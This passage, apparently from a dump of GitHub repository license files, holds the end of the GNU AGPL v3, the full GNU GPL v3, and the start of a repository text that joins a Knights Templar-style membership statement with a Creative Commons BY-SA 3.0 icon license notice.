of the Program or a work on which the Program is based.  The work thus licensed is called the contributor\'s ""contributor version"".    A contributor\'s ""essential patent claims"" are all patent claims owned or controlled by the contributor, whether already acquired or hereafter acquired, that would be infringed by some manner, permitted by this License, of making, using, or selling its contributor version, but do not include claims that would be infringed only as a consequence of further modification of the contributor version.  For purposes of this definition, ""control"" includes the right to grant patent sublicenses in a manner consistent with the requirements of this License.    Each contributor grants you a non-exclusive, worldwide, royalty-free patent license under the contributor\'s essential patent claims, to make, use, sell, offer for sale, import and otherwise run, modify and propagate the contents of its contributor version.    In the following three paragraphs, a ""patent license"" is any express agreement or commitment, however denominated, not to enforce a patent (such as an express permission to practice a patent or covenant not to sue for patent infringement).  To ""grant"" such a patent license to a party means to make such an agreement or commitment not to enforce a patent against the party.    If you convey a covered work, knowingly relying on a patent license, and the Corresponding Source of the work is not available for anyone to copy, free of charge and under the terms of this License, through a publicly available network server or other readily accessible means, then you must either (1) cause the Corresponding Source to be so available, or (2) arrange to deprive yourself of the benefit of the patent license for this particular work, or (3) arrange, in a manner consistent with the requirements of this License, to extend the patent license to downstream recipients.  ""Knowingly relying"" means you have actual knowledge that, but for the patent license, your conveying the covered work in a country, or your recipient\'s use of the covered work in a country, would infringe one or more identifiable patents in that country that you have reason to believe are valid.    If, pursuant to or in connection with a single transaction or arrangement, you convey, or propagate by procuring conveyance of, a covered work, and grant a patent license to some of the parties receiving the covered work authorizing them to use, propagate, modify or convey a specific copy of the covered work, then the patent license you grant is automatically extended to all recipients of the covered work and works based on it.    A patent license is ""discriminatory"" if it does not include within the scope of its coverage, prohibits the exercise of, or is conditioned on the non-exercise of one or more of the rights that are specifically granted under this License.  You may not convey a covered work if you are a party to an arrangement with a third party that is in the business of distributing software, under which you make payment to the third party based on the extent of your activity of conveying the work, and under which the third party grants, to any of the parties who would receive the covered work from you, a discriminatory patent license (a) in connection with copies of the covered work conveyed by you (or copies made from those copies), or (b) primarily for and in connection with specific products or compilations that contain the covered work, unless you entered into that arrangement, or that patent license was granted, prior to 28 March 2007.    Nothing in this License shall be construed as excluding or limiting any implied license or other defenses to infringement that may otherwise be available to you under applicable patent law.    12. No Surrender of Others\' Freedom.    If conditions are imposed on you (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not excuse you from the conditions of this License.  If you cannot convey a covered work so as to satisfy simultaneously your obligations under this License and any other pertinent obligations, then as a consequence you may not convey it at all.  For example, if you agree to terms that obligate you to collect a royalty for further conveying from those to whom you convey the Program, the only way you could satisfy both those terms and this License would be to refrain entirely from conveying the Program.    13. Remote Network Interaction; Use with the GNU General Public License.    Notwithstanding any other provision of this License, if you modify the Program, your modified version must prominently offer all users interacting with it remotely through a computer network (if your version supports such interaction) an opportunity to receive the Corresponding Source of your version by providing access to the Corresponding Source from a network server at no charge, through some standard or customary means of facilitating copying of software.  This Corresponding Source shall include the Corresponding Source for any work covered by version 3 of the GNU General Public License that is incorporated pursuant to the following paragraph.    Notwithstanding any other provision of this License, you have permission to link or combine any covered work with a work licensed under version 3 of the GNU General Public License into a single combined work, and to convey the resulting work.  The terms of this License will continue to apply to the part which is the covered work, but the work with which it is combined will remain governed by version 3 of the GNU General Public License.    14. Revised Versions of this License.    The Free Software Foundation may publish revised and/or new versions of the GNU Affero General Public License from time to time.  Such new versions will be similar in spirit to the present version, but may differ in detail to address new problems or concerns.    Each version is given a distinguishing version number.  If the Program specifies that a certain numbered version of the GNU Affero General Public License ""or any later version"" applies to it, you have the option of following the terms and conditions either of that numbered version or of any later version published by the Free Software Foundation.  If the Program does not specify a version number of the GNU Affero General Public License, you may choose any version ever published by the Free Software Foundation.    If the Program specifies that a proxy can decide which future versions of the GNU Affero General Public License can be used, that proxy\'s public statement of acceptance of a version permanently authorizes you to choose that version for the Program.    Later license versions may give you additional or different permissions.  However, no additional obligations are imposed on any author or copyright holder as a result of your choosing to follow a later version.    15. Disclaimer of Warranty.    THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.    16. Limitation of Liability.    IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.    17. Interpretation of Sections 15 and 16.    If the disclaimer of warranty and limitation of liability provided above cannot be given local legal effect according to their terms, reviewing courts shall apply local law that most closely approximates an absolute waiver of all civil liability in connection with the Program, unless a warranty or assumption of liability accompanies a copy of the Program in return for a fee.                       END OF TERMS AND CONDITIONS              How to Apply These Terms to Your New Programs    If you develop a new program, and you want it to be of the greatest possible use to the public, the best way to achieve this is to make it free software which everyone can redistribute and change under these terms.    To do so, attach the following notices to the program.  It is safest to attach them to the start of each source file to most effectively state the exclusion of warranty; and each file should have at least the ""copyright"" line and a pointer to where the full notice is found.      <one line to give the program\'s name and a brief idea of what it does.>     Copyright (C) <year>  <name of author>      This program is free software: you can redistribute it and/or modify     it under the terms of the GNU Affero General Public License as published     by the Free Software Foundation, either version 3 of the License, or     (at your option) any later version.      This program is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     GNU Affero General Public License for more details.      You should have received a copy of the GNU Affero General Public License     along with this program.  If not, see <http://www.gnu.org/licenses/>.  Also add information on how to contact you by electronic and paper mail.    If your software can interact with users remotely through a computer network, you should also make sure that it provides a way for users to get its source.  For example, if your program is a web application, its interface could display a ""Source"" link that leads users to an archive of the code.  There are many ways you could offer source, and different solutions will be better for different programs; see section 13 for the specific requirements.    You should also get your employer (if you work as a programmer) or school, if any, to sign a ""copyright disclaimer"" for the program, if necessary. For more information on this, and how to apply and follow the GNU AGPL, see <http://www.gnu.org/licenses/>.",,2
0,https://github.com/Noykarde/NoykardeRepository.git,"                    GNU GENERAL PUBLIC LICENSE                        Version 3, 29 June 2007   Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>  Everyone is permitted to copy and distribute verbatim copies  of this license document, but changing it is not allowed.                              Preamble    The GNU General Public License is a free, copyleft license for software and other kinds of works.    The licenses for most software and other practical works are designed to take away your freedom to share and change the works.  By contrast, the GNU General Public License is intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users.  We, the Free Software Foundation, use the GNU General Public License for most of our software; it applies also to any other work released this way by its authors.  You can apply it to your programs, too.    When we speak of free software, we are referring to freedom, not price.  Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things.    To protect your rights, we need to prevent others from denying you these rights or asking you to surrender the rights.  Therefore, you have certain responsibilities if you distribute copies of the software, or if you modify it: responsibilities to respect the freedom of others.    For example, if you distribute copies of such a program, whether gratis or for a fee, you must pass on to the recipients the same freedoms that you received.  You must make sure that they, too, receive or can get the source code.  And you must show them these terms so they know their rights.    Developers that use the GNU GPL protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License giving you legal permission to copy, distribute and/or modify it.    For the developers\' and authors\' protection, the GPL clearly explains that there is no warranty for this free software.  For both users\' and authors\' sake, the GPL requires that modified versions be marked as changed, so that their problems will not be attributed erroneously to authors of previous versions.    Some devices are designed to deny users access to install or run modified versions of the software inside them, although the manufacturer can do so.  This is fundamentally incompatible with the aim of protecting users\' freedom to change the software.  The systematic pattern of such abuse occurs in the area of products for individuals to use, which is precisely where it is most unacceptable.  Therefore, we have designed this version of the GPL to prohibit the practice for those products.  If such problems arise substantially in other domains, we stand ready to extend this provision to those domains in future versions of the GPL, as needed to protect the freedom of users.    Finally, every program is threatened constantly by software patents. States should not allow patents to restrict development and use of software on general-purpose computers, but in those that do, we wish to avoid the special danger that patents applied to a free program could make it effectively proprietary.  To prevent this, the GPL assures that patents cannot be used to render the program non-free.    The precise terms and conditions for copying, distribution and modification follow.                         TERMS AND CONDITIONS    0. Definitions.    ""This License"" refers to version 3 of the GNU General Public License.    ""Copyright"" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks.    ""The Program"" refers to any copyrightable work licensed under this License.  Each licensee is addressed as ""you"".  ""Licensees"" and ""recipients"" may be individuals or organizations.    To ""modify"" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy.  The resulting work is called a ""modified version"" of the earlier work or a work ""based on"" the earlier work.    A ""covered work"" means either the unmodified Program or a work based on the Program.    To ""propagate"" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy.  Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well.    To ""convey"" a work means any kind of propagation that enables other parties to make or receive copies.  Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying.    An interactive user interface displays ""Appropriate Legal Notices"" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License.  If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion.    1. Source Code.    The ""source code"" for a work means the preferred form of the work for making modifications to it.  ""Object code"" means any non-source form of a work.    A ""Standard Interface"" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language.    The ""System Libraries"" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form.  A ""Major Component"", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it.    The ""Corresponding Source"" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities.  However, it does not include the work\'s System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not part of the work.  For example, Corresponding Source includes interface definition files associated with source files for the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work.    The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source.    The Corresponding Source for a work in source code form is that same work.    2. Basic Permissions.    All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met.  This License explicitly affirms your unlimited permission to run the unmodified Program.  The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work.  This License acknowledges your rights of fair use or other equivalent, as provided by copyright law.    You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force.  You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright.  Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you.    Conveying under any other circumstances is permitted solely under the conditions stated below.  Sublicensing is not allowed; section 10 makes it unnecessary.    3. Protecting Users\' Legal Rights From Anti-Circumvention Law.    No covered work shall be deemed part of an effective technological measure under any applicable law fulfilling obligations under article 11 of the WIPO copyright treaty adopted on 20 December 1996, or similar laws prohibiting or restricting circumvention of such measures.    When you convey a covered work, you waive any legal power to forbid circumvention of technological measures to the extent such circumvention is effected by exercising rights under this License with respect to the covered work, and you disclaim any intention to limit operation or modification of the work as a means of enforcing, against the work\'s users, your or third parties\' legal rights to forbid circumvention of technological measures.    4. Conveying Verbatim Copies.    You may convey verbatim copies of the Program\'s source code as you receive it, in any medium, provided that you conspicuously and appropriately publish on each copy an appropriate copyright notice; keep intact all notices stating that this License and any non-permissive terms added in accord with section 7 apply to the code; keep intact all notices of the absence of any warranty; and give all recipients a copy of this License along with the Program.    You may charge any price or no price for each copy that you convey, and you may offer support or warranty protection for a fee.    5. Conveying Modified Source Versions.    You may convey a work based on the Program, or the modifications to produce it from the Program, in the form of source code under the terms of section 4, provided that you also meet all of these conditions:      a) The work must carry prominent notices stating that you modified     it, and giving a relevant date.      b) The work must carry prominent notices stating that it is     released under this License and any conditions added under section     7.  This requirement modifies the requirement in section 4 to     ""keep intact all notices"".      c) You must license the entire work, as a whole, under this     License to anyone who comes into possession of a copy.  This     License will therefore apply, along with any applicable section 7     additional terms, to the whole of the work, and all its parts,     regardless of how they are packaged.  This License gives no     permission to license the work in any other way, but it does not     invalidate such permission if you have separately received it.      d) If the work has interactive user interfaces, each must display     Appropriate Legal Notices; however, if the Program has interactive     interfaces that do not display Appropriate Legal Notices, your     work need not make them do so.    A compilation of a covered work with other separate and independent works, which are not by their nature extensions of the covered work, and which are not combined with it such as to form a larger program, in or on a volume of a storage or distribution medium, is called an ""aggregate"" if the compilation and its resulting copyright are not used to limit the access or legal rights of the compilation\'s users beyond what the individual works permit.  Inclusion of a covered work in an aggregate does not cause this License to apply to the other parts of the aggregate.    6. Conveying Non-Source Forms.    You may convey a covered work in object code form under the terms of sections 4 and 5, provided that you also convey the machine-readable Corresponding Source under the terms of this License, in one of these ways:      a) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by the     Corresponding Source fixed on a durable physical medium     customarily used for software interchange.      b) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by a     written offer, valid for at least three years and valid for as     long as you offer spare parts or customer support for that product     model, to give anyone who possesses the object code either (1) a     copy of the Corresponding Source for all the software in the     product that is covered by this License, on a durable physical     medium customarily used for software interchange, for a price no     more than your reasonable cost of physically performing this     conveying of source, or (2) access to copy the     Corresponding Source from a network server at no charge.      c) Convey individual copies of the object code with a copy of the     written offer to provide the Corresponding Source.  This     alternative is allowed only occasionally and noncommercially, and     only if you received the object code with such an offer, in accord     with subsection 6b.      d) Convey the object code by offering access from a designated     place (gratis or for a charge), and offer equivalent access to the     Corresponding Source in the same way through the same place at no     further charge.  You need not require recipients to copy the     Corresponding Source along with the object code.  If the place to     copy the object code is a network server, the Corresponding Source     may be on a different server (operated by you or a third party)     that supports equivalent copying facilities, provided you maintain     clear directions next to the object code saying where to find the     Corresponding Source.  Regardless of what server hosts the     Corresponding Source, you remain obligated to ensure that it is     available for as long as needed to satisfy these requirements.      e) Convey the object code using peer-to-peer transmission, provided     you inform other peers where the object code and Corresponding     Source of the work are being offered to the general public at no     charge under subsection 6d.    A separable portion of the object code, whose source code is excluded from the Corresponding Source as a System Library, need not be included in conveying the object code work.    A ""User Product"" is either (1) a ""consumer product"", which means any tangible personal property which is normally used for personal, family, or household purposes, or (2) anything designed or sold for incorporation into a dwelling.  In determining whether a product is a consumer product, doubtful cases shall be resolved in favor of coverage.  For a particular product received by a particular user, ""normally used"" refers to a typical or common use of that class of product, regardless of the status of the particular user or of the way in which the particular user actually uses, or expects or is expected to use, the product.  A product is a consumer product regardless of whether the product has substantial commercial, industrial or non-consumer uses, unless such uses represent the only significant mode of use of the product.    ""Installation Information"" for a User Product means any methods, procedures, authorization keys, or other information required to install and execute modified versions of a covered work in that User Product from a modified version of its Corresponding Source.  The information must suffice to ensure that the continued functioning of the modified object code is in no case prevented or interfered with solely because modification has been made.    If you convey an object code work under this section in, or with, or specifically for use in, a User Product, and the conveying occurs as part of a transaction in which the right of possession and use of the User Product is transferred to the recipient in perpetuity or for a fixed term (regardless of how the transaction is characterized), the Corresponding Source conveyed under this section must be accompanied by the Installation Information.  But this requirement does not apply if neither you nor any third party retains the ability to install modified object code on the User Product (for example, the work has been installed in ROM).    The requirement to provide Installation Information does not include a requirement to continue to provide support service, warranty, or updates for a work that has been modified or installed by the recipient, or for the User Product in which it has been modified or installed.  Access to a network may be denied when the modification itself materially and adversely affects the operation of the network or violates the rules and protocols for communication across the network.    Corresponding Source conveyed, and Installation Information provided, in accord with this section must be in a format that is publicly documented (and with an implementation available to the public in source code form), and must require no special password or key for unpacking, reading or copying.    7. Additional Terms.    ""Additional permissions"" are terms that supplement the terms of this License by making exceptions from one or more of its conditions. Additional permissions that are applicable to the entire Program shall be treated as though they were included in this License, to the extent that they are valid under applicable law.  If additional permissions apply only to part of the Program, that part may be used separately under those permissions, but the entire Program remains governed by this License without regard to the additional permissions.    When you convey a copy of a covered work, you may at your option remove any additional permissions from that copy, or from any part of it.  (Additional permissions may be written to require their own removal in certain cases when you modify the work.)  You may place additional permissions on material, added by you to a covered work, for which you have or can give appropriate copyright permission.    Notwithstanding any other provision of this License, for material you add to a covered work, you may (if authorized by the copyright holders of that material) supplement the terms of this License with terms:      a) Disclaiming warranty or limiting liability differently from the     terms of sections 15 and 16 of this License; or      b) Requiring preservation of specified reasonable legal notices or     author attributions in that material or in the Appropriate Legal     Notices displayed by works containing it; or      c) Prohibiting misrepresentation of the origin of that material, or     requiring that modified versions of such material be marked in     reasonable ways as different from the original version; or      d) Limiting the use for publicity purposes of names of licensors or     authors of the material; or      e) Declining to grant rights under trademark law for use of some     trade names, trademarks, or service marks; or      f) Requiring indemnification of licensors and authors of that     material by anyone who conveys the material (or modified versions of     it) with contractual assumptions of liability to the recipient, for     any liability that these contractual assumptions directly impose on     those licensors and authors.    All other non-permissive additional terms are considered ""further restrictions"" within the meaning of section 10.  If the Program as you received it, or any part of it, contains a notice stating that it is governed by this License along with a term that is a further restriction, you may remove that term.  If a license document contains a further restriction but permits relicensing or conveying under this License, you may add to a covered work material governed by the terms of that license document, provided that the further restriction does not survive such relicensing or conveying.    If you add terms to a covered work in accord with this section, you must place, in the relevant source files, a statement of the additional terms that apply to those files, or a notice indicating where to find the applicable terms.    Additional terms, permissive or non-permissive, may be stated in the form of a separately written license, or stated as exceptions; the above requirements apply either way.    8. Termination.    You may not propagate or modify a covered work except as expressly provided under this License.  Any attempt otherwise to propagate or modify it is void, and will automatically terminate your rights under this License (including any patent licenses granted under the third paragraph of section 11).    However, if you cease all violation of this License, then your license from a particular copyright holder is reinstated (a) provisionally, unless and until the copyright holder explicitly and finally terminates your license, and (b) permanently, if the copyright holder fails to notify you of the violation by some reasonable means prior to 60 days after the cessation.    Moreover, your license from a particular copyright holder is reinstated permanently if the copyright holder notifies you of the violation by some reasonable means, this is the first time you have received notice of violation of this License (for any work) from that copyright holder, and you cure the violation prior to 30 days after your receipt of the notice.    Termination of your rights under this section does not terminate the licenses of parties who have received copies or rights from you under this License.  If your rights have been terminated and not permanently reinstated, you do not qualify to receive new licenses for the same material under section 10.    9. Acceptance Not Required for Having Copies.    You are not required to accept this License in order to receive or run a copy of the Program.  Ancillary propagation of a covered work occurring solely as a consequence of using peer-to-peer transmission to receive a copy likewise does not require acceptance.  However, nothing other than this License grants you permission to propagate or modify any covered work.  These actions infringe copyright if you do not accept this License.  Therefore, by modifying or propagating a covered work, you indicate your acceptance of this License to do so.    10. Automatic Licensing of Downstream Recipients.    Each time you convey a covered work, the recipient automatically receives a license from the original licensors, to run, modify and propagate that work, subject to this License.  You are not responsible for enforcing compliance by third parties with this License.    An ""entity transaction"" is a transaction transferring control of an organization, or substantially all assets of one, or subdividing an organization, or merging organizations.  If propagation of a covered work results from an entity transaction, each party to that transaction who receives a copy of the work also receives whatever licenses to the work the party\'s predecessor in interest had or could give under the previous paragraph, plus a right to possession of the Corresponding Source of the work from the predecessor in interest, if the predecessor has it or can get it with reasonable efforts.    You may not impose any further restrictions on the exercise of the rights granted or affirmed under this License.  For example, you may not impose a license fee, royalty, or other charge for exercise of rights granted under this License, and you may not initiate litigation (including a cross-claim or counterclaim in a lawsuit) alleging that any patent claim is infringed by making, using, selling, offering for sale, or importing the Program or any portion of it.    11. Patents.    A ""contributor"" is a copyright holder who authorizes use under this License of the Program or a work on which the Program is based.  The work thus licensed is called the contributor\'s ""contributor version"".    A contributor\'s ""essential patent claims"" are all patent claims owned or controlled by the contributor, whether already acquired or hereafter acquired, that would be infringed by some manner, permitted by this License, of making, using, or selling its contributor version, but do not include claims that would be infringed only as a consequence of further modification of the contributor version.  For purposes of this definition, ""control"" includes the right to grant patent sublicenses in a manner consistent with the requirements of this License.    Each contributor grants you a non-exclusive, worldwide, royalty-free patent license under the contributor\'s essential patent claims, to make, use, sell, offer for sale, import and otherwise run, modify and propagate the contents of its contributor version.    In the following three paragraphs, a ""patent license"" is any express agreement or commitment, however denominated, not to enforce a patent (such as an express permission to practice a patent or covenant not to sue for patent infringement).  To ""grant"" such a patent license to a party means to make such an agreement or commitment not to enforce a patent against the party.    If you convey a covered work, knowingly relying on a patent license, and the Corresponding Source of the work is not available for anyone to copy, free of charge and under the terms of this License, through a publicly available network server or other readily accessible means, then you must either (1) cause the Corresponding Source to be so available, or (2) arrange to deprive yourself of the benefit of the patent license for this particular work, or (3) arrange, in a manner consistent with the requirements of this License, to extend the patent license to downstream recipients.  ""Knowingly relying"" means you have actual knowledge that, but for the patent license, your conveying the covered work in a country, or your recipient\'s use of the covered work in a country, would infringe one or more identifiable patents in that country that you have reason to believe are valid.    If, pursuant to or in connection with a single transaction or arrangement, you convey, or propagate by procuring conveyance of, a covered work, and grant a patent license to some of the parties receiving the covered work authorizing them to use, propagate, modify or convey a specific copy of the covered work, then the patent license you grant is automatically extended to all recipients of the covered work and works based on it.    A patent license is ""discriminatory"" if it does not include within the scope of its coverage, prohibits the exercise of, or is conditioned on the non-exercise of one or more of the rights that are specifically granted under this License.  You may not convey a covered work if you are a party to an arrangement with a third party that is in the business of distributing software, under which you make payment to the third party based on the extent of your activity of conveying the work, and under which the third party grants, to any of the parties who would receive the covered work from you, a discriminatory patent license (a) in connection with copies of the covered work conveyed by you (or copies made from those copies), or (b) primarily for and in connection with specific products or compilations that contain the covered work, unless you entered into that arrangement, or that patent license was granted, prior to 28 March 2007.    Nothing in this License shall be construed as excluding or limiting any implied license or other defenses to infringement that may otherwise be available to you under applicable patent law.    12. No Surrender of Others\' Freedom.    If conditions are imposed on you (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not excuse you from the conditions of this License.  If you cannot convey a covered work so as to satisfy simultaneously your obligations under this License and any other pertinent obligations, then as a consequence you may not convey it at all.  For example, if you agree to terms that obligate you to collect a royalty for further conveying from those to whom you convey the Program, the only way you could satisfy both those terms and this License would be to refrain entirely from conveying the Program.    13. Use with the GNU Affero General Public License.    Notwithstanding any other provision of this License, you have permission to link or combine any covered work with a work licensed under version 3 of the GNU Affero General Public License into a single combined work, and to convey the resulting work.  The terms of this License will continue to apply to the part which is the covered work, but the special requirements of the GNU Affero General Public License, section 13, concerning interaction through a network will apply to the combination as such.    14. Revised Versions of this License.    The Free Software Foundation may publish revised and/or new versions of the GNU General Public License from time to time.  Such new versions will be similar in spirit to the present version, but may differ in detail to address new problems or concerns.    Each version is given a distinguishing version number.  If the Program specifies that a certain numbered version of the GNU General Public License ""or any later version"" applies to it, you have the option of following the terms and conditions either of that numbered version or of any later version published by the Free Software Foundation.  If the Program does not specify a version number of the GNU General Public License, you may choose any version ever published by the Free Software Foundation.    If the Program specifies that a proxy can decide which future versions of the GNU General Public License can be used, that proxy\'s public statement of acceptance of a version permanently authorizes you to choose that version for the Program.    Later license versions may give you additional or different permissions.  However, no additional obligations are imposed on any author or copyright holder as a result of your choosing to follow a later version.    15. Disclaimer of Warranty.    THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.    16. Limitation of Liability.    IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.    17. Interpretation of Sections 15 and 16.    If the disclaimer of warranty and limitation of liability provided above cannot be given local legal effect according to their terms, reviewing courts shall apply local law that most closely approximates an absolute waiver of all civil liability in connection with the Program, unless a warranty or assumption of liability accompanies a copy of the Program in return for a fee.                       END OF TERMS AND CONDITIONS              How to Apply These Terms to Your New Programs    If you develop a new program, and you want it to be of the greatest possible use to the public, the best way to achieve this is to make it free software which everyone can redistribute and change under these terms.    To do so, attach the following notices to the program.  It is safest to attach them to the start of each source file to most effectively state the exclusion of warranty; and each file should have at least the ""copyright"" line and a pointer to where the full notice is found.      {one line to give the program\'s name and a brief idea of what it does.}     Copyright (C) {year}  {name of author}      This program is free software: you can redistribute it and/or modify     it under the terms of the GNU General Public License as published by     the Free Software Foundation, either version 3 of the License, or     (at your option) any later version.      This program is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     GNU General Public License for more details.      You should have received a copy of the GNU General Public License     along with this program.  If not, see <http://www.gnu.org/licenses/>.  Also add information on how to contact you by electronic and paper mail.    If the program does terminal interaction, make it output a short notice like this when it starts in an interactive mode:      {project}  Copyright (C) {year}  {fullname}     This program comes with ABSOLUTELY NO WARRANTY; for details type `show w\'.     This is free software, and you are welcome to redistribute it     under certain conditions; type `show c\' for details.  The hypothetical commands `show w\' and `show c\' should show the appropriate parts of the General Public License.  Of course, your program\'s commands might be different; for a GUI interface, you would use an ""about box"".    You should also get your employer (if you work as a programmer) or school, if any, to sign a ""copyright disclaimer"" for the program, if necessary. For more information on this, and how to apply and follow the GNU GPL, see <http://www.gnu.org/licenses/>.    The GNU General Public License does not permit incorporating your program into proprietary programs.  If your program is a subroutine library, you may consider it more useful to permit linking proprietary applications with the library.  If this is what you want to do, use the GNU Lesser General Public License instead of this License.  But first, please read <http://www.gnu.org/philosophy/why-not-lgpl.html>.",,2
0,https://github.com/honeybeeluv07/Deus-Vult-Ministries-Org.git,"The US Commandery Knights Templar Holy Order\'s expectations as participants in our local communities as a team of rescue & response units within the regions across America. The USC KT are formed together as retired Veterans, Military Servicemen, Law Enforcement Officials, Patriots, Freedom Lovers of Liberty, Guardians of our Great Nation, Ministers & Nuns, hardworking individuals formed together in unity under The Word of God as our Virtues of Conduct through our Love, Honor, Dedication of Servitude to our LORD & Savior Jesus Christ forever and ever.  Under such Rights & Privileges is our USC KT Memberships understanding of our Terms & Privileges -This work is licensed under Creative Commons\' Attribution-ShareAlike 3.0 United States (CC BY-SA 3.0) - http://creativecommons.org/licenses/by-sa/3.0/us/  If you use these icons, please add a link to Iconic (http://somerandomdude.com/work/iconic/) somewhere on your site or in your app.    LEGAL MUMBO-JUMBO  You are free:  to Share ‚Äî to copy, distribute and transmit the work to Remix ‚Äî to adapt the work to make commercial use of the work  Under the following conditions:  Attribution ‚Äî You must attribute the work in the manner specified by the author or licensor (but not in any way that suggests that they endorse you or your use of the work). Share Alike ‚Äî If you alter, transform, or build upon this work, you may distribute the resulting work only under the same or similar license to this one. With the understanding that:  Waiver ‚Äî Any of the above conditions can be waived if you get permission from the copyright holder. Public Domain ‚Äî Where the work or any of its elements is in the public domain under applicable law, that status is in no way affected by the license. Other Rights ‚Äî In no way are any of the following rights affected by the license: Your fair dealing or fair use rights, or other applicable copyright exceptions and limitations; Apart from the remix rights granted under this license, the author\'s moral rights; Rights other persons may have either in the work itself or in how the work is used, such as publicity or privacy rights. Notice ‚Äî For any reuse or distribution, you must make clear to others the license terms of this work. The best way to do this is with a link to this web page.   Full License   THE WORK (AS DEFINED BELOW) IS PROVIDED UNDER THE TERMS OF THIS CREATIVE COMMONS PUBLIC LICENSE (""CCPL"" OR ""LICENSE""). THE WORK IS PROTECTED BY COPYRIGHT AND/OR OTHER APPLICABLE LAW. ANY USE OF THE WORK OTHER THAN AS AUTHORIZED UNDER THIS LICENSE OR 